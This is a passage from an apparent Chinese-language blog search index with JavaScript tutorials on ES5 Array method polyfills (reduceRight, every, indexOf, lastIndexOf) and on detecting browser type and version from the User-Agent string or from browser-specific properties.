Object(this);</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 2. Let len be ? ToLength(? Get(O, &quot;length&quot;)).</span><br><span class="line">      var len &#x3D; o.length &gt;&gt;&gt; 0; </span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; Steps 3, 4, 5, 6, 7      </span><br><span class="line">      var k &#x3D; 0; </span><br><span class="line">      var value;</span><br><span class="line"></span><br><span class="line">      if (arguments.length &gt;&#x3D; 2) &#123;</span><br><span class="line">        value &#x3D; arguments[1];</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        while (k &lt; len &amp;&amp; !(k in o)) &#123;</span><br><span class="line">          k++; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 3. If len is 0 and initialValue is not present,</span><br><span class="line">        &#x2F;&#x2F;    throw a TypeError exception.</span><br><span class="line">        if (k &gt;&#x3D; len) &#123;</span><br><span class="line">          throw new TypeError( &#39;Reduce of empty array &#39; +</span><br><span class="line">            &#39;with no initial value&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">        value &#x3D; o[k++];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 8. Repeat, while k &lt; len</span><br><span class="line">      while (k &lt; len) &#123;</span><br><span class="line">        &#x2F;&#x2F; a. Let Pk be ! ToString(k).</span><br><span class="line">        &#x2F;&#x2F; b. Let kPresent be ? HasProperty(O, Pk).</span><br><span class="line">        &#x2F;&#x2F; c. If kPresent is true, then</span><br><span class="line">        &#x2F;&#x2F;    i.  Let kValue be ? Get(O, Pk).</span><br><span class="line">        &#x2F;&#x2F;    ii. Let accumulator be ? Call(</span><br><span class="line">        &#x2F;&#x2F;          callbackfn, undefined,</span><br><span class="line">        &#x2F;&#x2F;          « accumulator, kValue, k, O »).</span><br><span class="line">        if (k in o) &#123;</span><br><span class="line">          value &#x3D; callback(value, o[k], k, o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; d. Increase k by 1.      </span><br><span class="line">        k++;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 9. Return accumulator.</span><br><span class="line">      return value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JS Array常用方法详解及兼容性代码（二）</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JS-Array%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%85%BC%E5%AE%B9%E6%80%A7%E4%BB%A3%E7%A0%81%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>[ ES5中，Array新增API（下）之reduceRight、every、indexOf]</p>
<p>#五： reduceRight<br>reduceRight() 方法接受一个函数作为累加器（accumulator）和数组的每个值（从右到左）将其减少为单个值。<br><strong>注意:</strong> <code>Array.prototype.reduce()方法对累加器和数组中的每个元素（从左到右）应用一个函数，将其减少为单个值。&quot;) 的执行方向相反</code></p>
<p><strong>示例:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let flattened &#x3D; [</span><br><span class="line">    [0, 1], </span><br><span class="line">    [2, 3], </span><br><span class="line">    [4, 5]</span><br><span class="line">].reduceRight((a, b) &#x3D;&gt; &#123;</span><br><span class="line">    return a.concat(b);</span><br><span class="line">&#125;, []);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; flattened is [4, 5, 2, 3, 0, 1]</span><br></pre></td></tr></table></figure>
<p><strong>语法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arr.reduceRight(callback[, initialValue])</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong><br><code>callback</code><br>一个回调函数，用来操作数组中的每个元素，可接受四个参数：</p>
<blockquote>
<p><code>previousValue</code><br>上一次调用回调的返回值，或提供的 initialValue<br><code>currentValue</code><br>当前被处理的元素<br><code>index</code><br>当前处理元素的索引<br><code>array</code><br>调用 reduce 的数组</p>
</blockquote>
<p><code>initialValue</code><br>可作为第一次调用回调 callback 的第一个参数<br><strong>返回值</strong><br>执行之后的返回值</p>
<p><strong>兼容旧环境</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (&#39;function&#39; !&#x3D;&#x3D; typeof Array.prototype.reduceRight) &#123;</span><br><span class="line">  Array.prototype.reduceRight &#x3D; function(callback &#x2F;*, initialValue*&#x2F;) &#123;</span><br><span class="line">    &#39;use strict&#39;;</span><br><span class="line">    if (null &#x3D;&#x3D;&#x3D; this || &#39;undefined&#39; &#x3D;&#x3D;&#x3D; typeof this) &#123;</span><br><span class="line">      throw new TypeError(&#39;Array.prototype.reduce called on null or undefined&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (&#39;function&#39; !&#x3D;&#x3D; typeof callback) &#123;</span><br><span class="line">      throw new TypeError(callback + &#39; is not a function&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    var t &#x3D; Object(this), len &#x3D; t.length &gt;&gt;&gt; 0, k &#x3D; len - 1, value;</span><br><span class="line">    if (arguments.length &gt;&#x3D; 2) &#123;</span><br><span class="line">      value &#x3D; arguments[1];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      while (k &gt;&#x3D; 0 &amp;&amp; !(k in t)) &#123;</span><br><span class="line">        k--;</span><br><span class="line">      &#125;</span><br><span class="line">      if (k &lt; 0) &#123;</span><br><span class="line">        throw new TypeError(&#39;Reduce of empty array with no initial value&#39;);</span><br><span class="line">      &#125;</span><br><span class="line">      value &#x3D; t[k--];</span><br><span class="line">    &#125;</span><br><span class="line">    for (; k &gt;&#x3D; 0; k--) &#123;</span><br><span class="line">      if (k in t) &#123;</span><br><span class="line">        value &#x3D; callback(value, t[k], k, t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>#六： every<br>every() 方法测试数组的所有元素是否都通过了指定函数的测试。</p>
<p><strong>语法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arr.every(callback[, thisArg])</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong><br><code>callback</code><br>用来测试每个元素的函数。<br><code>thisArg</code><br>执行 callback 时使用的 this 值。</p>
<p><strong>注意：</strong><code>every 和数学中的&quot;所有&quot;类似，当所有的元素都符合条件才返回true。另外，空数组也是返回true。</code></p>
<p><strong>兼容旧环境</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!Array.prototype.every)</span><br><span class="line">&#123;</span><br><span class="line">  Array.prototype.every &#x3D; function(fun &#x2F;*, thisArg *&#x2F;)</span><br><span class="line">  &#123;</span><br><span class="line">    &#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">    if (this &#x3D;&#x3D;&#x3D; void 0 || this &#x3D;&#x3D;&#x3D; null)</span><br><span class="line">      throw new TypeError();</span><br><span class="line"></span><br><span class="line">    var t &#x3D; Object(this);</span><br><span class="line">    var len &#x3D; t.length &gt;&gt;&gt; 0;</span><br><span class="line">    if (typeof fun !&#x3D;&#x3D; &#39;function&#39;)</span><br><span class="line">        throw new TypeError();</span><br><span class="line"></span><br><span class="line">    var thisArg &#x3D; arguments.length &gt;&#x3D; 2 ? arguments[1] : void 0;</span><br><span class="line">    for (var i &#x3D; 0; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      if (i in t &amp;&amp; !fun.call(thisArg, t[i], i, t))</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>#七： indexOf<br>indexOf()方法返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。<br><strong>注意:</strong> <code>对于String方法，请参阅 [String.prototype.indexOf()]&quot;)。 </code></p>
<p><strong>语法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arr.indexOf(searchElement)</span><br><span class="line">arr.indexOf(searchElement[, fromIndex &#x3D; 0])</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong><br><code>searchElement</code><br>要查找的元素<br><code>fromIndex</code><br>开始查找的位置。如果该索引值大于或等于数组长度，意味着不会在数组里查找，返回-1。如果参数中提供的索引值是一个负值，则将其作为数组末尾的一个抵消，即-1表示从最后一个元素开始查找，-2表示从倒数第二个元素开始查找 ，以此类推。 注意：如果参数中提供的索引值是一个负值，并不改变其查找顺序，查找顺序仍然是从前向后查询数组。如果抵消后的索引值仍小于0，则整个数组都将会被查询。其默认值为0.</p>
<p><strong>返回值</strong><br>首个被找到的元素在数组中的索引位置; 若没有找到则返回 -1</p>
<p><strong>兼容旧环境</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!Array.prototype.indexOf) &#123;</span><br><span class="line">  Array.prototype.indexOf &#x3D; function(searchElement, fromIndex) &#123;</span><br><span class="line"></span><br><span class="line">    var k;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 1. Let O be the result of calling ToObject passing</span><br><span class="line">    &#x2F;&#x2F;    the this value as the argument.</span><br><span class="line">    if (this &#x3D;&#x3D; null) &#123;</span><br><span class="line">      throw new TypeError(&#39;&quot;this&quot; is null or not defined&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var O &#x3D; Object(this);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 2. Let lenValue be the result of calling the Get</span><br><span class="line">    &#x2F;&#x2F;    internal method of O with the argument &quot;length&quot;.</span><br><span class="line">    &#x2F;&#x2F; 3. Let len be ToUint32(lenValue).</span><br><span class="line">    var len &#x3D; O.length &gt;&gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 4. If len is 0, return -1.</span><br><span class="line">    if (len &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">      return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 5. If argument fromIndex was passed let n be</span><br><span class="line">    &#x2F;&#x2F;    ToInteger(fromIndex); else let n be 0.</span><br><span class="line">    var n &#x3D; +fromIndex || 0;</span><br><span class="line"></span><br><span class="line">    if (Math.abs(n) &#x3D;&#x3D;&#x3D; Infinity) &#123;</span><br><span class="line">      n &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 6. If n &gt;&#x3D; len, return -1.</span><br><span class="line">    if (n &gt;&#x3D; len) &#123;</span><br><span class="line">      return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 7. If n &gt;&#x3D; 0, then Let k be n.</span><br><span class="line">    &#x2F;&#x2F; 8. Else, n&lt;0, Let k be len - abs(n).</span><br><span class="line">    &#x2F;&#x2F;    If k is less than 0, then let k be 0.</span><br><span class="line">    k &#x3D; Math.max(n &gt;&#x3D; 0 ? n : len - Math.abs(n), 0);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 9. Repeat, while k &lt; len</span><br><span class="line">    while (k &lt; len) &#123;</span><br><span class="line">      &#x2F;&#x2F; a. Let Pk be ToString(k).</span><br><span class="line">      &#x2F;&#x2F;   This is implicit for LHS operands of the in operator</span><br><span class="line">      &#x2F;&#x2F; b. Let kPresent be the result of calling the</span><br><span class="line">      &#x2F;&#x2F;    HasProperty internal method of O with argument Pk.</span><br><span class="line">      &#x2F;&#x2F;   This step can be combined with c</span><br><span class="line">      &#x2F;&#x2F; c. If kPresent is true, then</span><br><span class="line">      &#x2F;&#x2F;    i.  Let elementK be the result of calling the Get</span><br><span class="line">      &#x2F;&#x2F;        internal method of O with the argument ToString(k).</span><br><span class="line">      &#x2F;&#x2F;   ii.  Let same be the result of applying the</span><br><span class="line">      &#x2F;&#x2F;        Strict Equality Comparison Algorithm to</span><br><span class="line">      &#x2F;&#x2F;        searchElement and elementK.</span><br><span class="line">      &#x2F;&#x2F;  iii.  If same is true, return k.</span><br><span class="line">      if (k in O &amp;&amp; O[k] &#x3D;&#x3D;&#x3D; searchElement) &#123;</span><br><span class="line">        return k;</span><br><span class="line">      &#125;</span><br><span class="line">      k++;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="八：-lastIndexOf"><a href="#八：-lastIndexOf" class="headerlink" title="八： lastIndexOf"></a>八： lastIndexOf</h1><p>lastIndexOf() 方法返回指定元素（也即有效的 JavaScript 值或变量）在数组中的最后一个的索引，如果不存在则返回 -1。从数组的后面向前查找，从 fromIndex 处开始。</p>
<p><strong>语法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arr.lastIndexOf(searchElement[, fromIndex &#x3D; arr.length - 1])</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong><br><code>searchElement</code><br>被查找的元素。<br><code>fromIndex</code><br>从此位置开始逆向查找。默认为数组的长度减 1，即整个数组都被查找。如果该值大于或等于数组的长度，则整个数组会被查找。如果为负值，将其视为从数组末尾向前的偏移。即使该值为负，数组仍然会被从后向前查找。如果该值为负时，其绝对值大于数组长度，则方法返回 -1，即数组不会被查找。<br><strong>返回值</strong><br>数组中最后一个元素的索引，如未找到返回-1</p>
<p><strong>注意：</strong><code>lastIndexOf使用[严格相等](strict equality，即 ===）比较 searchElement和数组中的元素。 </code></p>
<p><strong>兼容旧环境</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!Array.prototype.lastIndexOf) &#123;</span><br><span class="line">  Array.prototype.lastIndexOf &#x3D; function(searchElement &#x2F;*, fromIndex*&#x2F;) &#123;</span><br><span class="line">    &#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">    if (this &#x3D;&#x3D;&#x3D; void 0 || this &#x3D;&#x3D;&#x3D; null) &#123;</span><br><span class="line">      throw new TypeError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var n, k,</span><br><span class="line">        t &#x3D; Object(this),</span><br><span class="line">        len &#x3D; t.length &gt;&gt;&gt; 0;</span><br><span class="line">    if (len &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">      return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    n &#x3D; len - 1;</span><br><span class="line">    if (arguments.length &gt; 1) &#123;</span><br><span class="line">      n &#x3D; Number(arguments[1]);</span><br><span class="line">      if (n !&#x3D; n) &#123;</span><br><span class="line">        n &#x3D; 0;</span><br><span class="line">      &#125;</span><br><span class="line">      else if (n !&#x3D; 0 &amp;&amp; n !&#x3D; (1 &#x2F; 0) &amp;&amp; n !&#x3D; -(1 &#x2F; 0)) &#123;</span><br><span class="line">        n &#x3D; (n &gt; 0 || -1) * Math.floor(Math.abs(n));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (k &#x3D; n &gt;&#x3D; 0</span><br><span class="line">          ? Math.min(n, len - 1)</span><br><span class="line">          : len - Math.abs(n); k &gt;&#x3D; 0; k--) &#123;</span><br><span class="line">      if (k in t &amp;&amp; t[k] &#x3D;&#x3D;&#x3D; searchElement) &#123;</span><br><span class="line">        return k;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript判断浏览器类型及版本</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%88%A4%E6%96%AD%E6%B5%8F%E8%A7%88%E5%99%A8%E7%B1%BB%E5%9E%8B%E5%8F%8A%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<p>浏览器对于我们来说，可能是最熟悉的工具了。记得最早那会Netscape，到后来的Internet Explorer一统江湖，再到现在的FireFox大行其道，浏览器市场的争夺，可谓是硝烟弥漫。熟知的浏览器Firefox、Opera、Safari、IE、Chrome以外，据说世界上还有近百种浏览器。</p>
<p>在我们的产品开发过程中，经常要考虑浏览器兼容问题，以适应不同的用户人群，同时也减少因浏览器兼容问题所带来的服务量。一般来说，通过JavaScript判断浏览器类型，我们通常使用两种方法，一种是根据各种浏览器独有的属性来分辨，另一种是通过分析浏览器的user-Agent属性来判断的。在许多情况下，值判断出浏览器类型之后，还需判断浏览器版本才能处理兼容性问题，而判断浏览器的版本一般只能通过分析浏览器的User-Agent才能知道。现在比较流行的javascript框架，都有浏览器兼容的判断代码，像jquery、YUI就是使用User-Agent，而Mootools则是使用用各种浏览器独有的属性来分辨。</p>
<p>先来看看什么是<code>User-Agent</code>？User-Agent是HTTP请求中的用户标识，一般发送一个能够代表客户端类型的字符串，比如浏览器类型 操作系统等信息。User-Agent 的约定格式是：应用名，跟一个斜线，跟版本号，剩下的是自由的格式。</p>
<h3 id="我们先来看一下常用浏览器的User-Agent："><a href="#我们先来看一下常用浏览器的User-Agent：" class="headerlink" title="我们先来看一下常用浏览器的User-Agent："></a>我们先来看一下常用浏览器的User-Agent：</h3><p><code>IE</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 6.0)</span><br><span class="line">Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.2)</span><br><span class="line">Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span><br><span class="line">Mozilla&#x2F;4.0 (compatible; MSIE 5.0; Windows NT)</span><br><span class="line">其中，版本号是MSIE之后的数字。</span><br></pre></td></tr></table></figure>
<p><code>Firefox</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.2) Gecko&#x2F;2008070208 Firefox&#x2F;3.0.1</span><br><span class="line">Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1) Gecko&#x2F;20070309 Firefox&#x2F;2.0.0.3</span><br><span class="line">Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1) Gecko&#x2F;20070803 Firefox&#x2F;1.5.0.12</span><br><span class="line">其中，版本号是Firefox之后的数字。</span><br></pre></td></tr></table></figure>
<p>·Safari·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.2) AppleWebKit&#x2F;525.13 (KHTML, ** Gecko) Version&#x2F;3.1 Safari&#x2F;525.13</span><br><span class="line">Mozilla&#x2F;5.0 (iPhone; U; CPU ** Mac OS X) AppleWebKit&#x2F;420.1 (KHTML, ** Gecko) Version&#x2F;3.0 Mobile&#x2F;4A93 Safari&#x2F;419.3 </span><br><span class="line">其版本号是Version之后的数字。</span><br></pre></td></tr></table></figure>
<p><code>Chrome</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.2) AppleWebKit&#x2F;525.13 (KHTML, ** Gecko) Chrome&#x2F;0.2.149.27 Safari&#x2F;525.13</span><br><span class="line">其中，版本号在Chrome只后的数字。</span><br></pre></td></tr></table></figure>
<h2 id="一-基于User-Agent信息的实现"><a href="#一-基于User-Agent信息的实现" class="headerlink" title="一.基于User-Agent信息的实现"></a>一.基于User-Agent信息的实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var Sys &#x3D; &#123;&#125;;  </span><br><span class="line">var ua &#x3D; navigator.userAgent.toLowerCase();  </span><br><span class="line">var s;  </span><br><span class="line">(s &#x3D; ua.match(&#x2F;msie ([\d.]+)&#x2F;)) ? Sys.ie &#x3D; s[1] :  </span><br><span class="line">(s &#x3D; ua.match(&#x2F;firefox\&#x2F;([\d.]+)&#x2F;)) ? Sys.firefox &#x3D; s[1] :  </span><br><span class="line">(s &#x3D; ua.match(&#x2F;chrome\&#x2F;([\d.]+)&#x2F;)) ? Sys.chrome &#x3D; s[1] :  </span><br><span class="line">(s &#x3D; ua.match(&#x2F;opera.([\d.]+)&#x2F;)) ? Sys.opera &#x3D; s[1] :  </span><br><span class="line">(s &#x3D; ua.match(&#x2F;version\&#x2F;([\d.]+).*safari&#x2F;)) ? Sys.safari &#x3D; s[1] : 0;   </span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F;以下进行测试  </span><br><span class="line">if (Sys.ie) document.write(&#39;IE: &#39; + Sys.ie);  </span><br><span class="line">if (Sys.firefox) document.write(&#39;Firefox: &#39; + Sys.firefox);  </span><br><span class="line">if (Sys.chrome) document.write(&#39;Chrome: &#39; + Sys.chrome);  </span><br><span class="line">if (Sys.opera) document.write(&#39;Opera: &#39; + Sys.opera);  </span><br><span class="line">if (Sys.safari) document.write(&#39;Safari: &#39; + Sys.safari);  </span><br></pre></td></tr></table></figure>
<h2 id="二-根据浏览器特有属性判断"><a href="#二-根据浏览器特有属性判断" class="headerlink" title="二.根据浏览器特有属性判断"></a>二.根据浏览器特有属性判断</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Browser &#x3D; &#123;</span><br><span class="line"></span><br><span class="line">    Engine: &#123;name: &#39;unknown&#39;, version: 0&#125;,</span><br><span class="line"></span><br><span class="line">    Features: &#123;</span><br><span class="line">        xpath: !!(document.evaluate),     &#x2F;&#x2F; 是否支持 XPath</span><br><span class="line">        air: !!(window.runtime),        &#x2F;&#x2F; 是否支持 Air 扩展</span><br><span class="line">        query: !!(document.querySelector) &#x2F;&#x2F; 是否支持 CSS 选择器</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    Engines: &#123;</span><br><span class="line">        &#x2F;&#x2F; 判断 Opera</span><br><span class="line">        presto: function () &#123;</span><br><span class="line">            return (!window.opera) ? false : ((arguments.callee.caller) ? 960 : ((document.getElementsByClassName) ? 950 : 925));</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x2F;&#x2F; 判断 IE，根据 ActiveX 和 特有的 XMLHttpRequest 对象</span><br><span class="line">        trident: function () &#123;</span><br><span class="line">            return (!window.ActiveXObject) ? false : ((window.XMLHttpRequest) ? 5 : 4);</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x2F;&#x2F; Webkit 核心的浏览器，如 Safari 和 Chrome</span><br><span class="line">        webkit: function () &#123;</span><br><span class="line">            return (navigator.taintEnabled) ? false : ((Browser.Features.xpath) ? ((Browser.Features.query) ? 525 : 420) : 419);</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x2F;&#x2F; Mozilla Gecko 核心浏览器，如 Firefox</span><br><span class="line">        gecko: function () &#123;</span><br><span class="line">            return (document.getBoxObjectFor &#x3D;&#x3D; undefined) ? false : ((document.getElementsByClassName) ? 19 : 18);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">或者</span><br><span class="line">var Sys &#x3D; &#123;&#125;;</span><br><span class="line">var ua &#x3D; navigator.userAgent.toLowerCase();</span><br><span class="line">window.ActiveXObject ? Sys.ie &#x3D; ua.match(&#x2F;msie ([\d.]+)&#x2F;)[1] :</span><br><span class="line">    document.getBoxObjectFor ? Sys.firefox &#x3D; ua.match(&#x2F;firefox\&#x2F;([\d.]+)&#x2F;)[1] :</span><br><span class="line">        window.MessageEvent &amp;&amp; !document.getBoxObjectFor ? Sys.chrome &#x3D; ua.match(&#x2F;chrome\&#x2F;([\d.]+)&#x2F;)[1] :</span><br><span class="line">            window.opera ? Sys.opera &#x3D; ua.match(&#x2F;opera.([\d.]+)&#x2F;)[1] :</span><br><span class="line">                window.openDatabase ? Sys.safari &#x3D; ua.match(&#x2F;version\&#x2F;([\d.]+)&#x2F;)[1] : 0;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;以下进行测试</span><br><span class="line">if (Sys.ie) document.write(&#39;IE: &#39; + Sys.ie);</span><br><span class="line">if (Sys.firefox) document.write(&#39;Firefox: &#39; + Sys.firefox);</span><br><span class="line">if (Sys.chrome) document.write(&#39;Chrome: &#39; + Sys.chrome);</span><br><span class="line">if (Sys.opera) document.write(&#39;Opera: &#39; + Sys.opera);</span><br><span class="line">if (Sys.safari) document.write(&#39;Safari: &#39; + Sys.safari);</span><br></pre></td></tr></table></figure>
<p>但是，这两种检测方法都有其局限性，User-Agent 是可以通过代码修改的，所以纯粹检测User-Agent可能会带来一定的风险，而且ie8的Compatibility View 功能造成单浏览器会“原生”多个 User-agent 。使用不同特征来判断浏览器的方法，</p>
<p>虽然在速度上比用正则表达式分析userAgent要来的快，不过这些特征可能会随浏览器版本而变化。比如，一种浏览器本来独有的特性取得了市场上的成功，其他浏览器也就可能跟着加入该特性，从而使该浏览器的独有特征消失，导致我们的判断失败。因此，</p>
<p>相对比较保险的做法是通过解析userAgent中的特征来判断浏览器类型。何况，反正判断版本信息也需要解析浏览器的userAgent的。所以，在我们的实际编程中，还得根据实际情况来决定使用哪种方法来判断浏览器类型和版本。</p>
<p>ppk on javascript中有关浏览器检测的看法和建议</p>
<p>1、Opera，iCab等非主流浏览器提供给用户自己修改识别字符串，以访问更多的网站。<br>2、Opera 在navigator.userAgent永远包含一个子字符串Opera，即使当它处于伪装模式时也一样。而且Opera是唯一支持window.opera属性的浏览器<br>3、Safari、iCab和Konqueror 在navigator.userAgent有它们自己的标识符，那他们也有可能不包含，为了伪装。<br>4、Gecko  Mozilla的识别字符串中通常包含Gecko，不过，Safari的默认字符串中也包含Gecko<br>5、MSIE 大部分浏览器都拿它来伪装，因此它的出现说明不了任何问题。</p>
<h2 id="三-ppk中有关浏览器检测的代码"><a href="#三-ppk中有关浏览器检测的代码" class="headerlink" title="三.ppk中有关浏览器检测的代码"></a>三.ppk中有关浏览器检测的代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var BrowserDetect &#x3D; &#123;</span><br><span class="line">    init: function () &#123;</span><br><span class="line">        this.browser &#x3D; this.searchString(this.dataBrowser) || &quot;An unknown browser&quot;;</span><br><span class="line">        this.version &#x3D; this.searchVersion(navigator.userAgent)</span><br><span class="line">            || this.searchVersion(navigator.appVersion)</span><br><span class="line">            || &quot;an unknown version&quot;;</span><br><span class="line">        this.OS &#x3D; this.searchString(this.dataOS) || &quot;an unknown OS&quot;;</span><br><span class="line">    &#125;,</span><br><span class="line">    searchString: function (data) &#123;</span><br><span class="line">        for (var i&#x3D;0;i&lt;data.length;i++)    &#123;</span><br><span class="line">            var dataString &#x3D; data[i].string;</span><br><span class="line">            var dataProp &#x3D; data[i].prop;</span><br><span class="line">            this.versionSearchString &#x3D; data[i].versionSearch || data[i].identity;</span><br><span class="line">            if (dataString) &#123;</span><br><span class="line">                if (dataString.indexOf(data[i].subString) !&#x3D; -1)</span><br><span class="line">                    return data[i].identity;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (dataProp)</span><br><span class="line">                return data[i].identity;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    searchVersion: function (dataString) &#123;</span><br><span class="line">        var index &#x3D; dataString.indexOf(this.versionSearchString);</span><br><span class="line">        if (index &#x3D;&#x3D; -1) return;</span><br><span class="line">        return parseFloat(dataString.substring(index+this.versionSearchString.length+1));</span><br><span class="line">    &#125;,</span><br><span class="line">    dataBrowser: [</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.userAgent,</span><br><span class="line">            subString: &quot;Chrome&quot;,</span><br><span class="line">            identity: &quot;Chrome&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;     string: navigator.userAgent,</span><br><span class="line">            subString: &quot;OmniWeb&quot;,</span><br><span class="line">            versionSearch: &quot;OmniWeb&#x2F;&quot;,</span><br><span class="line">            identity: &quot;OmniWeb&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.vendor,</span><br><span class="line">            subString: &quot;Apple&quot;,</span><br><span class="line">            identity: &quot;Safari&quot;,</span><br><span class="line">            versionSearch: &quot;Version&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            prop: window.opera,</span><br><span class="line">            identity: &quot;Opera&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.vendor,</span><br><span class="line">            subString: &quot;iCab&quot;,</span><br><span class="line">            identity: &quot;iCab&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.vendor,</span><br><span class="line">            subString: &quot;KDE&quot;,</span><br><span class="line">            identity: &quot;Konqueror&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.userAgent,</span><br><span class="line">            subString: &quot;Firefox&quot;,</span><br><span class="line">            identity: &quot;Firefox&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.vendor,</span><br><span class="line">            subString: &quot;Camino&quot;,</span><br><span class="line">            identity: &quot;Camino&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;        &#x2F;&#x2F; for newer Netscapes (6+)</span><br><span class="line">            string: navigator.userAgent,</span><br><span class="line">            subString: &quot;Netscape&quot;,</span><br><span class="line">            identity: &quot;Netscape&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            string: navigator.userAgent,</span><br><span class="line">            subString: &quot;MSIE&quot;,</span><br><span class="line">            